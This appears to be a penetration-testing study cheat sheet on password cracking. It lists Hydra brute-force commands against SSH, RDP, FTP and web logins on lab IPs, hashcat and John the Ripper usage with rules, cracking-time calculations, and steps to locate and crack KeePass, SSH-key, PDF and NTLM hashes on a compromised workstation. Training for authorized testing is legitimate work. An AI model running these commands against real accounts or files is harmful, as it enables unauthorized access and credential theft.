# Password Cracking

### Hydra

#### Simple SSH & RDP Examples

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
...
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

#### Cracking PDF

```bash
pdf2john Infrustructure.pdf > pdf.hash
john -wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

#### Hydra FTP Example (with known usernames)

```bash
hydra -I -V -f -L users.txt -u -P /opt/SecLists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp
```

#### HTTP Examples

As before, we'll specify -l for the user, -P for the wordlist, the target IP without any protocol, and a new http-post-form argument, which accepts three colon-delimited fields.

The first field indicates the location of the login form. In this demonstration, the login form is located on the index.php web page. The second field specifies the request body used for providing a username and password to the login form, which we retrieved with Burp. Finally we must provide the failed login identifier, also known as a condition string.

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

When you run into Basic Authentication, use the following script as a reference:

```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://192.168.249.201/:A=BASIC:F=401"
```

---

You can think of John the Ripper as more of a CPU intensive password cracking tool that supports GPUs, while HashCat is more of a GPU-centered cracking tool, with support for CPUs.

For most algorithms, a GPU is much faster than a CPU since modern GPUs contain thousands of cores, each of which can share part of the workload. However, some slow hashing algorithms (like bcrypt) work better on CPUs.

#### Calculating Cracking Time

The cracking time can be calculated by dividing the keyspace with the hash rate.

The keyspace consists of the character set to the power of the amount of characters or length of the original information (password). For example, if we use the lower-case Latin alphabet (26 characters), upper case alphabet (26 characters), and the numbers from 0 to 9 (10 characters), we have a character set of 62 possible variations for every character. If we are faced with a five-character password, we are facing 62 to the power of five possible passwords containing these five characters.

```bash
python3 -c "print(62**5)"
```

We'll use hashcat with -b to initiate benchmark mode. First, we'll benchmark a CPU by running it in a Kali VM without any GPUs attached. Following along on a local Kali system, the results may differ.

```bash
hashcat -b
```

For now, we are only interested in MD5, SHA1, and SHA-256. The values of the hash rates are in MH/s in which 1 MH/s equals 1,000,000 hashes per second.

Example:
```bash
Algorithm 	GPU 	CPU
MD5 	68,185.1 MH/s 	450.8 MH/s
SHA1 	21,528.2 MH/s 	298.3 MH/s
SHA256 	9,276.3 MH/s 	134.2 MH/s
```

```bash
kali@kali:~$ python3 -c "print(916132832 / 134200000)"
6.826623189269746

kali@kali:~$ python3 -c "print(916132832 / 9276300000)"
0.09876058687192092
```

---

### Mutating Passwords

Removing number sequences from a password list:

```bash
# More specifically this removes passwords that start with the letter 1, and does the modification in place, not leaving empty newlines

sed -i '/^1/d' demo.txt
```

If you want to view how the demo rules work:

```bash
kali@kali:~/passwordattacks$ hashcat -r demo.rule --stdout demo.txt
password1
iloveyou1
princess1
rockyou1
abc1231
```

This sets the crack mode to MD5, with the hash being in crackme.txt, and sets the demo rules on the rockyou.txt wordlsit, with the argument '--force' to use a CPU for the cracking.

```bash
kali@kali:~/passwordattacks$ cat crackme.txt     
f621b6c9eab51a3e2f4e167fee4c6860

kali@kali:~/passwordattacks$ cat demo3.rule   
$1 c $!
$2 c $!
$1 $2 $3 c $!

kali@kali:~/passwordattacks$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
``` 

### Password Cracking Process

We can describe the process of cracking a hash with the following steps:

    1. Extract hashes
    2. Format hashes
    3. Calculate the cracking time
    4. Prepare wordlist
    5. Attack the hash

You can identify the hash type with *hash-identifier* or *hashid*, which are installed on Kali.

We must take special care in copying and pasting our hashes. An extra space or a newline could render our efforts worthless. In addition, we should be sure of the hash type we are using. For example, hashid can't automatically determine if b08ff247dc7c5658ff64c53e8b0db462 is MD2, MD4, or MD5. An incorrect choice will obviously waste time. We can avoid this situation by double-checking the results with other tools and doing additional research.

**If you manage to get access to a client's workstation, check if they are running a password manager. If they are, try to crack the master password.**

#### Recursively Search a User's Workstation for KeePass Database

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

The JtR suite includes various transformation scripts like ssh2john and keepass2john, which can format a broad range of different file formats, and they are installed by default on our Kali machine. We can also use these scripts to format hashes for Hashcat.

Let's use the keepass2john script to format the database file and save the output to keepass.hash.

```bash
kali@kali:~/passwordattacks$ ls -la Database.kdbx
-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx


kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash   

kali@kali:~/passwordattacks$ cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

In our case, the JtR script prepended the filename Database to the hash. The script does this to act as the username for the target hash. This is helpful when cracking database hashes, since we want the output to contain the corresponding username and not only the password. Since KeePass uses a master password without any kind of username, we need to remove the "Database:" string with a text editor.


We're using the rule '/usr/share/hashcat/rules/rockyou-30000.rule' because it is very effective with the rockyou.txt wordlist, as it was made for it.

```bash
kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
```

#### Using Rules with JTR

To be able to use the previously created rules in JtR, we need to add a name for the rules and append them to the /etc/john/john.conf configuration file. For this demonstration, we'll name the rule sshRules with a "List.Rules" rule naming syntax (as shown in Listing 34). We'll use sudo and sh -c to append the contents of our rule file into /etc/john/john.conf.

```bash
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

Now that we've successfully added our sshRules to the JtR configuration file, we can use john to crack the passphrase in the final step of our methodology. We'll define our wordlist with --wordlist=ssh.passwords, select the previously created rule with --rules=sshRules, and provide the hash of the private key as the final argument, ssh.hash.

```bash
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

#### NTLM Hashes

```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```